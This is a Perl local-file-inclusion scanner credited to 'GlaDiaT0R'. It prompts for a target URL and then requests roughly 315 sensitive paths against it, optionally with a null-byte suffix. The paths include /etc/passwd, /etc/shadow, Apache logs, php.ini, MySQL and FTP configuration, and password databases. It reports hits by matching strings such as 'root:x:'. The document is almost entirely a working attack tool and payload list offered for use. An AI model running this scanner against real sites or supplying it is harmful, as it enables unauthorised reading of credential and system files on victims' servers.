#!/usr/bin/perl
#LFI Scanner By GlaDiaT0R
#My Mail: the_gl4di4t0r[AT]hotmail[DOT]com
#Home Page: DarkGh0st.Com
#Greetz To Boomrang_victim, Marwen_Neo & All Tunisian Hackers
#www.darkgh0st.com 
#www.tunisian-power.net
use Socket;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;

regex();
header();

#data

print colored ("\n>",'bold blue' );print "Enter The Enlace[...]\n";
print colored ("\n>",'bold blue' );chomp($link = <STDIN>);
print "Con byte Null al Final \"y/n\"  ";print colored ("> ",'bold blue' );
chomp($byte=<STDIN>);
if($link !~ /http:\/\//) 
	{
		$link = "http://$link"; 

	}	

#httpd type scan

print colored ("\n===>",'bold blue' );print "Press [enter] To Check the version of httpd[...]\n";
$httpd =<STDIN>;

$host = $link;
$useragent = LWP::UserAgent->new;
$resp = $useragent->head($host);
print $resp->headers_as_string;

print colored ("\n===>",'bold blue' );print "Press [ENTER] To Check LFI Vulnerability[...]\n";
$start =<STDIN>;

# scanning 315 paths

@vuls = ('/etc/passwd',
'/etc/shadow',
'/proc/self/stat',
'/etc/cgi-bin',
'/etc/group',
'/etc/security/group',
'/etc/security/passwd',
'/etc/security/user',
'/etc/security/environ',
'/etc/security/limits',
'/usr/lib/security/mkuser.default',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/var/log/apache/access_log',
'/var/log/apache2/access_log',
'/var/log/apache/access.log',
'/var/log/apache2/access.log',
'/var/log/access_log',
'/var/log/access.log',
'/var/www/logs/error_log',
'/var/www/logs/error.log',
'/usr/local/apache/logs/error_log',
'/usr/local/apache/logs/error.log',
'/var/log/apache/error_log',
'/var/log/apache2/error_log',
'/var/log/apache/error.log',
'/var/log/apache2/error.log',
'/var/log/error_log',
'/var/log/error.log',
'/var/log/httpd/access_log',
'/var/log/httpd/error_log',
'/var/log/httpd/access_log',
'/var/log/httpd/error_log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/usr/local/apache/logs/error_log',
'/usr/local/apache/logs/error.log',
'/usr/local/apache2/logs/access_log',
'/usr/local/apache2/logs/access.log',
'/usr/local/apache2/logs/error_log',
'/usr/local/apache2/logs/error.log',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/var/www/logs/error_log',
'/var/www/logs/error.log',
'/var/log/httpd/access_log',
'/var/log/httpd/access.log',
'/var/log/httpd/error_log',
'/var/log/httpd/error.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/apache/error_log',
'/var/log/apache/error.log',
'/var/log/apache2/access_log',
'/var/log/apache2/access.log',
'/var/log/apache2/error_log',
'/var/log/apache2/error.log',
'/var/log/access_log',
'/var/log/access.log',
'/var/log/error_log',
'/var/log/error.log',
'/opt/lampp/logs/access_log',
'/opt/lampp/logs/error_log',
'/opt/xampp/logs/access_log',
'/opt/xampp/logs/error_log',
'/opt/lampp/logs/access.log',
'/opt/lampp/logs/error.log',
'/opt/xampp/logs/access.log',
'/opt/xampp/logs/error.log',
'/Program Files\Apache Group\Apache\logs\access.log',
'/Program Files\Apache Group\Apache\logs\error.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/access_log',
'/var/www/logs/error_log',
'/var/www/logs/error.log',
'/usr/local/apache/logs/error_log',
'/usr/local/apache/logs/error.log',
'/var/log/apache/error_log',
'/var/log/apache/error.log',
'/var/log/access_log',
'/var/log/error_log',
'/usr/local/apache/conf/httpd.conf',
'/usr/local/apache2/conf/httpd.conf',
'/etc/httpd/conf/httpd.conf',
'/etc/apache/conf/httpd.conf',
'/usr/local/etc/apache/conf/httpd.conf',
'/etc/apache2/httpd.conf',
'/usr/local/apache/conf/httpd.conf',
'/usr/local/apache2/conf/httpd.conf',
'/usr/local/apache/httpd.conf',
'/usr/local/apache2/httpd.conf',
'/usr/local/httpd/conf/httpd.conf',
'/usr/local/etc/apache/conf/httpd.conf',
'/usr/local/etc/apache2/conf/httpd.conf',
'/usr/local/etc/httpd/conf/httpd.conf',
'/usr/apache2/conf/httpd.conf',
'/usr/apache/conf/httpd.conf',
'/usr/local/apps/apache2/conf/httpd.conf',
'/usr/local/apps/apache/conf/httpd.conf',
'/etc/apache/conf/httpd.conf',
'/etc/apache2/conf/httpd.conf',
'/etc/httpd/conf/httpd.conf',
'/etc/http/conf/httpd.conf',
'/etc/apache2/httpd.conf',
'/etc/httpd/httpd.conf',
'/etc/http/httpd.conf',
'/etc/httpd.conf',
'/opt/apache/conf/httpd.conf',
'/opt/apache2/conf/httpd.conf',
'/var/www/conf/httpd.conf',
'/private/etc/httpd/httpd.conf',
'/private/etc/httpd/httpd.conf.default',
'/Volumes/webBackup/opt/apache2/conf/httpd.conf',
'/Volumes/webBackup/private/etc/httpd/httpd.conf',
'/Volumes/webBackup/private/etc/httpd/httpd.conf.default',
'/Program Files\Apache Group\Apache\conf\httpd.conf',
'/Program Files\Apache Group\Apache2\conf\httpd.conf',
'/Program Files\xampp\apache\conf\httpd.conf',
'/usr/local/php/httpd.conf.php',
'/usr/local/php4/httpd.conf.php',
'/usr/local/php5/httpd.conf.php',
'/usr/local/php/httpd.conf',
'/usr/local/php4/httpd.conf',
'/usr/local/php5/httpd.conf',
'/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf',
'/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf',
'/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf',
'/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php',
'/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php',
'/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php',
'/usr/local/etc/apache/vhosts.conf',
'/etc/php.ini',
'/bin/php.ini',
'/etc/httpd/php.ini',
'/usr/lib/php.ini',
'/usr/lib/php/php.ini',
'/usr/local/etc/php.ini',
'/usr/local/lib/php.ini',
'/usr/local/php/lib/php.ini',
'/usr/local/php4/lib/php.ini',
'/usr/local/php5/lib/php.ini',
'/usr/local/apache/conf/php.ini',
'/etc/php4.4/fcgi/php.ini',
'/etc/php4/apache/php.ini',
'/etc/php4/apache2/php.ini',
'/etc/php5/apache/php.ini',
'/etc/php5/apache2/php.ini',
'/etc/php/php.ini',
'/etc/php/php4/php.ini',
'/etc/php/apache/php.ini',
'/etc/php/apache2/php.ini',
'/web/conf/php.ini',
'/usr/local/Zend/etc/php.ini',
'/opt/xampp/etc/php.ini',
'/var/local/www/conf/php.ini',
'/etc/php/cgi/php.ini',
'/etc/php4/cgi/php.ini',
'/etc/php5/cgi/php.ini',
'/php5\php.ini',
'/php4\php.ini',
'/php\php.ini',
'/PHP\php.ini',
'/WINDOWS\php.ini',
'/WINNT\php.ini',
'/apache\php\php.ini',
'/xampp\apache\bin\php.ini',
'/NetServer\bin\stable\apache\php.ini',
'/home2\bin\stable\apache\php.ini',
'/home\bin\stable\apache\php.ini',
'/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini',
'/usr/local/cpanel/logs',
'/usr/local/cpanel/logs/stats_log',
'/usr/local/cpanel/logs/access_log',
'/usr/local/cpanel/logs/error_log',
'/usr/local/cpanel/logs/license_log',
'/usr/local/cpanel/logs/login_log',
'/usr/local/cpanel/logs/stats_log',
'/var/cpanel/cpanel.config',
'/var/log/mysql/mysql-bin.log',
'/var/log/mysql.log',
'/var/log/mysqlderror.log',
'/var/log/mysql/mysql.log',
'/var/log/mysql/mysql-slow.log',
'/var/mysql.log',
'/var/lib/mysql/my.cnf',
'/etc/mysql/my.cnf',
'/etc/my.cnf',
'/etc/logrotate.d/proftpd',
'/www/logs/proftpd.system.log',
'/var/log/proftpd',
'/etc/proftp.conf',
'/etc/protpd/proftpd.conf',
'/etc/vhcs2/proftpd/proftpd.conf',
'/etc/proftpd/modules.conf',
'/var/log/vsftpd.log',
'/etc/vsftpd.chroot_list',
'/etc/logrotate.d/vsftpd.log',
'/etc/vsftpd/vsftpd.conf',
'/etc/vsftpd.conf',
'/etc/chrootUsers',
'/var/log/xferlog',
'/var/adm/log/xferlog',
'/etc/wu-ftpd/ftpaccess',
'/etc/wu-ftpd/ftphosts',
'/etc/wu-ftpd/ftpusers',
'/usr/sbin/pure-config.pl',
'/usr/etc/pure-ftpd.conf',
'/etc/pure-ftpd/pure-ftpd.conf',
'/usr/local/etc/pure-ftpd.conf',
'/usr/local/etc/pureftpd.pdb',
'/usr/local/pureftpd/etc/pureftpd.pdb',
'/usr/local/pureftpd/sbin/pure-config.pl',
'/usr/local/pureftpd/etc/pure-ftpd.conf',
'-/etc/pure-ftpd.conf',
'/etc/pure-ftpd/pure-ftpd.pdb',
'/etc/pureftpd.pdb',
'/etc/pureftpd.passwd',
'/etc/pure-ftpd/pureftpd.pdb',
'/usr/ports/ftp/pure-ftpd/',
'/usr/ports/net/pure-ftpd/',
'/usr/pkgsrc/net/pureftpd/',
'/usr/ports/contrib/pure-ftpd/',
'/var/log/pure-ftpd/pure-ftpd.log',
'/logs/pure-ftpd.log',
'/var/log/pureftpd.log',
'/var/log/ftp-proxy/ftp-proxy.log',
'/var/log/ftp-proxy',
'/var/log/ftplog',
'/etc/logrotate.d/ftp',
'/etc/ftpchroot',
'/etc/ftphosts',
'/var/log/exim_mainlog',
'/var/log/exim/mainlog',
'/var/log/maillog',
'/var/log/exim_paniclog',
'/var/log/exim/paniclog',
'/var/log/exim/rejectlog',
'/var/log/exim_rejectlog');

print colored ("\n>",'bold blue' );print "start scaning[...]\n";


foreach $scan(@vuls){
if($byte=~/y/){
$url = $link.$scan."%00";
print "$url";
}else
{
$url = $link.$scan;
}
#$request = HTTP::Request->new(GET=>$url);
#$useragent = LWP::UserAgent->new();
#$response = $useragent->request($request);
#$response->is_success;
#$response->content;
$cookie_jar = HTTP::Cookies->new;
$ua= LWP::UserAgent->new(agent => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12');
             $ua->timeout(10);
			 $cookie_jar->set_cookie("1","PHPSESSID","r3j5pan250kr83us23sokbuot7");
			 $ua->cookie_jar($cookie_jar);
             $response = $ua->get($url);
             $response=$response->content;

if ($response =~ /root:x:/ || $response =~  /GET/ || $response =~  /\(php\)/ || $response =~  /\[error]/ || $response =~  /\[notice]/) 
				{ 
                    print colored ("[+]", 'bold red');print "$scan....................OK! :)\n";
				}
$response="";
}

sub regex(){
$sis="$^O";if ($sis eq windows){ $cmd="clear";} else { $cmd="cls"; }
system("$cmd");
}

sub header(){
print colored ("\n===========================================================\n[+]", 'bold blue');
print "\t Logs-LFI-Totex 1.0 | By MagnoBalt \t\t";print colored ("[+]", 'bold blue');
print colored ("\n===========================================================", 'bold blue');

}
